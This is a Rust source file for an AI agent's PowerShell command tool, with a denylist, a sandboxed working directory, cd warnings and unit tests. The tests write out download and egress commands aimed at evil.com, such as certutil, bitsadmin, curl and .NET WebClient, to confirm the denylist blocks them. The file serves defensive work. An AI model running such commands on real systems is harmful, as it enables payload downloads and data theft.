//! Shell execution: [`PowerShellExecutor`], [`CommandDenylist`], and [`RunCommand`] tool.
//!
//! [`PowerShellExecutor`] implements the [`ShellExecutor`] trait from `rho-core`,
//! providing PowerShell-specific command execution with `pwsh`/`powershell`
//! detection, timeout support, and cancellation.
//!
//! [`CommandDenylist`] enforces a list of dangerous commands that must not be
//! executed. The default PowerShell denylist blocks destructive and
//! network-exfiltration commands.
//!
//! [`RunCommand`] is the tool that exposes shell execution to the model. It
//! checks the denylist, normalizes paths, flags working directory escapes,
//! then delegates to a `Box<dyn ShellExecutor>`.

use crate::ToolError;
use async_trait::async_trait;
use rho_core::{
    Result, SandboxRoot, ShellExecutor, ShellOutput, ToolName, ToolRisk,
    tool::{CancellationToken, Tool, ToolOutcome, ToolResult},
};
use std::path::{Path, PathBuf};
use std::time::Duration;
use std::time::Instant;
use tokio::io::AsyncWriteExt;
use tokio::process::Command;
use tracing::{debug, error, info, warn};

// ── CommandDenylist (re-exported from rho-core) ────────────────────────────

pub use rho_core::denylist::CommandDenylist;

// ── PowerShellExecutor ────────────────────────────────────────────────────────

/// A [`ShellExecutor`] that runs commands via PowerShell.
///
/// On construction, detects whether `pwsh` (PowerShell 7+) or `powershell`
/// (Windows PowerShell 5.1) is available. The detected executable is cached
/// for the lifetime of the executor.
///
/// Commands are executed with `-NoProfile -NonInteractive -Command <command>`.
/// When using `powershell.exe`, `-ExecutionPolicy Bypass` is added to avoid
/// script-signing failures.
///
/// Path separators are normalized (forward slashes → backslashes) in
/// path-like contexts before execution.
pub struct PowerShellExecutor {
    /// The detected PowerShell executable (cached at construction time).
    shell: &'static str,
}

impl PowerShellExecutor {
    /// Create a new executor, detecting the available PowerShell.
    ///
    /// Tries `pwsh` first (PowerShell 7+), then falls back to `powershell`
    /// (Windows PowerShell 5.1).
    ///
    /// # Errors
    ///
    /// Returns [`ToolError::Internal`] if neither PowerShell is found on `PATH`.
    pub fn new() -> crate::ToolResult<Self> {
        let shell = detect_powershell().ok_or_else(|| ToolError::Internal {
            message: "no PowerShell found on PATH — install PowerShell 7+ (pwsh) or ensure Windows PowerShell (powershell) is available".into(),
        })?;
        Ok(Self { shell })
    }

    /// Returns the detected PowerShell executable name.
    pub fn shell_exe(&self) -> &'static str {
        self.shell
    }

    /// Build the argument list for spawning PowerShell.
    fn build_args(&self, command: &str) -> Vec<String> {
        let mut args = Vec::new();

        // Windows PowerShell needs ExecutionPolicy Bypass to avoid
        // script-signing failures on constrained systems.
        if self.shell == "powershell" {
            args.push("-ExecutionPolicy".to_owned());
            args.push("Bypass".to_owned());
        }

        args.push("-NoProfile".to_owned());
        args.push("-NonInteractive".to_owned());
        args.push("-Command".to_owned());
        args.push(command.to_owned());

        args
    }
}

// NOTE: No `Default` impl — `PowerShellExecutor::new()` returns `ToolResult`
// because PowerShell detection can fail. Use `.expect()` or `?` explicitly.

#[async_trait]
impl ShellExecutor for PowerShellExecutor {
    async fn execute(
        &self,
        command: &str,
        working_dir: &Path,
        timeout: Option<Duration>,
        cancel: CancellationToken,
        input: Option<&str>,
    ) -> Result<ShellOutput> {
        if cancel.is_cancelled() {
            return Err(ToolError::Cancelled.into());
        }

        let args = self.build_args(command);

        let mut child = Command::new(self.shell)
            .args(&args)
            .current_dir(working_dir)
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .map_err(|e| {
                error!(shell = self.shell, command = %command, error = %e, "failed to spawn shell process");
                ToolError::CommandSpawn {
                    command: self.shell.to_string(),
                    source: e,
                }
            })?;

        // Write the input to the child's stdin, then close it.
        // When input is None this just sends EOF, which causes
        // interactive prompts to fail fast instead of hanging.
        if let Some(mut stdin_handle) = child.stdin.take() {
            if let Some(text) = input {
                stdin_handle.write_all(text.as_bytes()).await.map_err(|e| {
                    ToolError::FileSystem {
                        path: PathBuf::from("<stdin>"),
                        source: e,
                    }
                })?;
            }
            // Drop closes the pipe, sending EOF.
            drop(stdin_handle);
        }

        let child_id = child.id();

        let run_future = async {
            let output = child
                .wait_with_output()
                .await
                .map_err(|e| ToolError::FileSystem {
                    path: PathBuf::from("<process_wait>"),
                    source: e,
                })?;

            let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
            let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
            let exit_code = output.status.code().unwrap_or(-1);

            Ok(ShellOutput::new(stdout, stderr, exit_code))
        };

        // Wrap with optional timeout.
        if let Some(dur) = timeout {
            tokio::select! {
                res = tokio::time::timeout(dur, run_future) => {
                    if let Ok(inner) = res { inner } else {
                        // Timeout elapsed — kill the process.
                        warn!(
                            shell = self.shell,
                            command = %command,
                            timeout_ms = u64::try_from(dur.as_millis()).unwrap_or(u64::MAX),
                            "shell command timed out"
                        );
                        kill_process(child_id).await;
                        Err(ToolError::Timeout {
                            duration_ms: u64::try_from(dur.as_millis()).unwrap_or(u64::MAX),
                        }.into())
                    }
                }
                () = cancel.cancelled() => {
                    kill_process(child_id).await;
                    Err(ToolError::Cancelled.into())
                }
            }
        } else {
            tokio::select! {
                res = run_future => res,
                () = cancel.cancelled() => {
                    kill_process(child_id).await;
                    Err(ToolError::Cancelled.into())
                }
            }
        }
    }
}

// ── RunCommand ────────────────────────────────────────────────────────────────

/// Execute a shell command and capture stdout/stderr.
///
/// Before delegating to the [`ShellExecutor`], `RunCommand`:
/// 1. Checks the command against the [`CommandDenylist`] — denied commands
///    return an error result without spawning a process.
/// 2. Detects working directory escape attempts (`cd ..`, `Set-Location ..`)
///    and adds a warning to the output.
///
/// Runs within the sandbox root as the working directory.
pub struct RunCommand {
    /// Sandbox root used as the working directory for all commands.
    pub root: SandboxRoot,
    /// The shell executor that runs commands.
    pub executor: Box<dyn ShellExecutor>,
    /// The denylist to check before execution.
    pub denylist: CommandDenylist,
}

#[async_trait]
impl Tool for RunCommand {
    fn name(&self) -> ToolName {
        ToolName::from("run_command")
    }

    fn description(&self) -> &str {
        "Execute a PowerShell command within the project directory \
         and return its stdout, stderr, and exit code. \
         Use the optional cwd parameter to run in a subdirectory \
         instead of the project root. \
         Use the optional input parameter to pipe text to the command's \
         stdin — this is needed for commands that prompt for confirmation \
         (e.g. `cargo release --execute` asks `[y/N]`). When input is not \
         provided, stdin is closed immediately; commands that try to read \
         stdin will get EOF instead of hanging."
    }

    fn parameters_schema(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The PowerShell command to execute."
                },
                "cwd": {
                    "type": "string",
                    "description": "Working directory for the command, relative to the project root. Defaults to the project root if omitted."
                },
                "input": {
                    "type": "string",
                    "description": "Optional text to pipe to the command's stdin. Use this for commands that require interactive confirmation (e.g. `y\\n` for a yes/no prompt). When omitted, stdin is closed immediately (EOF)."
                }
            },
            "required": ["command"]
        })
    }

    fn risk(&self) -> ToolRisk {
        ToolRisk::Destructive
    }

    async fn execute(
        &self,
        arguments: serde_json::Value,
        cancel: CancellationToken,
    ) -> Result<ToolOutcome> {
        let command = arguments["command"]
            .as_str()
            .ok_or_else(|| ToolError::MissingArgument {
                name: "command".to_owned(),
            })?
            .to_owned();
        let cwd_arg = arguments["cwd"].as_str();
        let input_arg = arguments["input"].as_str().map(str::to_owned);

        if cancel.is_cancelled() {
            return Ok(ToolOutcome::Immediate(ToolResult::error("cancelled")));
        }

        // 1. Denylist check — refuse dangerous commands before execution.
        if let Some(reason) = self.denylist.check(&command) {
            warn!(command = %command, reason = %reason, "command denied by denylist");
            return Ok(ToolOutcome::Immediate(ToolResult::error(format!(
                "command denied: {reason}"
            ))));
        }

        // 2. Resolve working directory — use cwd if provided, else project root.
        let working_dir = if let Some(rel) = cwd_arg {
            let candidate = self.root.path().join(rel);
            // Validate that the resolved path is within the sandbox.
            let safe = self.root.validate(&candidate)?;
            if !safe.is_dir() {
                return Ok(ToolOutcome::Immediate(ToolResult::error(format!(
                    "run_command: cwd `{rel}` is not a directory"
                ))));
            }
            safe.to_path_buf()
        } else {
            self.root.path().to_path_buf()
        };

        // 3. Execute the command.
        let start = Instant::now();
        debug!(command = %command, cwd = %working_dir.display(), "executing shell command");
        let shell_output = self
            .executor
            .execute(&command, &working_dir, None, cancel, input_arg.as_deref())
            .await?;
        let elapsed = start.elapsed();
        info!(
            command = %command,
            exit_code = shell_output.exit_code,
            duration_ms = u64::try_from(elapsed.as_millis()).unwrap_or(u64::MAX),
            stdout_len = shell_output.stdout.len(),
            stderr_len = shell_output.stderr.len(),
            "shell command completed"
        );

        // 4. Map ShellOutput → ToolResult at the tool boundary.
        let combined = if shell_output.stderr.is_empty() {
            shell_output.stdout.clone()
        } else if shell_output.stdout.is_empty() {
            format!("stderr:\n{}", shell_output.stderr)
        } else {
            format!("{}\nstderr:\n{}", shell_output.stdout, shell_output.stderr)
        };

        // 5. Ephemeral cd warning.
        let warning = cd_warning(&command);

        let result = if shell_output.is_success() {
            ToolResult::success(format!(
                "exit_code: {}\n{}{combined}",
                shell_output.exit_code,
                warning.unwrap_or_default()
            ))
        } else {
            ToolResult::error(format!(
                "exit_code: {}\n{}{combined}",
                shell_output.exit_code,
                warning.unwrap_or_default()
            ))
        };

        Ok(ToolOutcome::Immediate(result))
    }
}

// ── Path normalization ────────────────────────────────────────────────────────

// ── Working directory escape detection ────────────────────────────────────────

/// Detect if a command attempts to change the working directory.
///
/// Returns `Some(warning)` if the command contains `cd`, `Set-Location`, or
/// `Push-Location`. Every `run_command` starts a fresh process in the project
/// root, so directory changes are ephemeral — this warning tells the model
/// to include full paths in every command.
///
/// This is a best-effort heuristic — it catches the common cases but cannot
/// detect every possible escape technique (environment variable expansion,
/// indirection via aliases, etc.). The approval gate is the primary defense.
fn cd_warning(command: &str) -> Option<String> {
    const NOTE: &str = "[NOTE: each run_command starts a fresh process in the project root. \
\ncd and Set-Location do not persist between commands. \
\nInclude the full relative path from the project root in every command. \
\nAlternatively, use the `cwd` parameter: \
\n  run_command(cwd=\"<subdirectory>\", command=\"<your command>\") \
\nThis is more reliable than cd/Set-Location.]\n";

    let lower = command.to_lowercase();

    // Check for `cd`, `Set-Location`, or `Push-Location` patterns.
    // Match: "cd src", "cd ..", "Set-Location rho-core/src", etc.
    if let Some(pos) = lower.find("cd ") {
        // Avoid matching cmdlets that happen to start with "cd" (unlikely
        // but defensive). "cd " followed by something is always a cd invocation.
        let after = lower[pos + 3..].trim_start();
        if !after.is_empty() {
            return Some(NOTE.to_string());
        }
    }

    if lower.contains("set-location ") {
        return Some(NOTE.to_string());
    }

    if lower.contains("push-location ") {
        return Some(NOTE.to_string());
    }

    None
}

// ── Helpers ───────────────────────────────────────────────────────────────────

/// Detect the best available PowerShell executable.
///
/// Tries `pwsh` first (PowerShell 7+), then falls back to `powershell`
/// (Windows PowerShell 5.1). Returns `None` if neither is found.
fn detect_powershell() -> Option<&'static str> {
    // Try pwsh first.
    if which_exists("pwsh") {
        return Some("pwsh");
    }
    // Fall back to Windows PowerShell.
    if which_exists("powershell") {
        return Some("powershell");
    }
    None
}

/// Check whether an executable exists on `PATH`.
fn which_exists(name: &str) -> bool {
    which::which(name).is_ok()
}

/// Kill a process by PID.
///
/// Uses `taskkill /F /PID <pid>` on Windows and `kill -9 <pid>` on
/// macOS/Linux. If `child_id` is `None` or the kill fails, the error
/// is silently ignored — we did our best.
async fn kill_process(child_id: Option<u32>) {
    if let Some(id) = child_id {
        if cfg!(target_os = "windows") {
            let _ = Command::new("taskkill")
                .args(["/PID", &id.to_string(), "/F"])
                .output()
                .await;
        } else {
            let _ = Command::new("kill")
                .args(["-9", &id.to_string()])
                .output()
                .await;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── CommandDenylist ────────────────────────────────────────────────────

    #[test]
    fn denylist_default_blocks_remove_item() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("Remove-Item foo").is_some());
    }

    #[test]
    fn denylist_default_blocks_invoke_webrequest() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("Invoke-WebRequest https://x").is_some());
    }

    #[test]
    fn denylist_default_blocks_recurse_force() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("Get-ChildItem -Recurse -Force").is_some());
    }

    #[test]
    fn denylist_default_allows_safe_commands() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("Get-ChildItem").is_none());
        assert!(dl.check("Write-Output 'hello'").is_none());
    }

    #[test]
    fn denylist_is_case_insensitive() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("remove-item foo").is_some());
        assert!(dl.check("REMOVE-ITEM foo").is_some());
    }

    // ── Network egress / LOLBIN denylist ───────────────────────────────────

    #[test]
    fn denylist_blocks_curl() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("curl https://evil.com").is_some());
    }

    #[test]
    fn denylist_blocks_wget() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("wget https://evil.com").is_some());
    }

    #[test]
    fn denylist_blocks_bitsadmin() {
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("bitsadmin /transfer job https://evil.com")
                .is_some()
        );
    }

    #[test]
    fn denylist_blocks_certutil() {
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("certutil -urlcache -split -f https://evil.com")
                .is_some()
        );
    }

    #[test]
    fn denylist_blocks_dotnet_webclient_bracket() {
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("[System.Net.WebClient]::new().DownloadString('https://evil.com')")
                .is_some()
        );
    }

    #[test]
    fn denylist_blocks_dotnet_httpclient_bracket() {
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("[System.Net.Http.HttpClient]::new().GetStringAsync('https://evil.com')")
                .is_some()
        );
    }

    #[test]
    fn denylist_blocks_dotnet_tcpclient_bracket() {
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("[System.Net.Sockets.TcpClient]::new('evil.com', 443)")
                .is_some()
        );
    }

    #[test]
    fn denylist_blocks_dotnet_type_accelerator() {
        // PowerShell type accelerators like [WebClient] or [HttpClient] are
        // shorter forms that also need to be caught.
        let dl = CommandDenylist::default_powershell();
        // The substring ".webclient]" catches [System.Net.WebClient]
        // and also the type-accelerator-like $x.WebClient]
        assert!(dl.check("$wc = [System.Net.WebClient]::new()").is_some());
    }

    #[test]
    fn denylist_does_not_block_benign_webclient_variable() {
        // A variable name like $WebClientResult should NOT trigger the
        // .WebClient] substring because it lacks the closing bracket.
        // But $WebClient] would trigger — that's an acceptable tradeoff
        // since the ] is unusual in variable names.
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("$WebClientResult = Get-Content file.txt")
                .is_none(),
            "benign variable name should not trigger denylist"
        );
    }

    #[test]
    fn denylist_blocks_dotnet_substrings_case_insensitive() {
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("[system.net.webclient]::new()").is_some(),
            "lowercase .NET type should be caught"
        );
    }

    // ── cd warning detection ─────────────────────────────────────────────

    #[test]
    fn warns_on_cd_dotdot() {
        assert!(cd_warning("cd ..").is_some());
    }

    #[test]
    fn warns_on_cd_dotdot_with_path() {
        assert!(cd_warning("cd ../other").is_some());
    }

    #[test]
    fn warns_on_cd_subdirectory() {
        assert!(cd_warning("cd src").is_some());
    }

    #[test]
    fn warns_on_cd_absolute_path() {
        assert!(cd_warning("cd C:\\Users").is_some());
    }

    #[test]
    fn warns_on_set_location() {
        assert!(cd_warning("Set-Location ..").is_some());
    }

    #[test]
    fn warns_on_set_location_subdirectory() {
        assert!(cd_warning("Set-Location rho-core/src").is_some());
    }

    #[test]
    fn warns_on_set_location_case_insensitive() {
        assert!(cd_warning("set-location ..").is_some());
    }

    #[test]
    fn warns_on_push_location() {
        assert!(cd_warning("Push-Location src").is_some());
    }

    #[test]
    fn no_warning_for_regular_command() {
        assert!(cd_warning("Get-ChildItem").is_none());
    }

    #[test]
    fn no_warning_for_cargo_check() {
        assert!(cd_warning("cargo check").is_none());
    }

    #[test]
    fn warning_contains_use_full_paths() {
        let note = cd_warning("cd src").unwrap();
        assert!(note.contains("full relative path"));
        assert!(note.contains("fresh process"));
        assert!(note.contains("cwd"));
    }
}
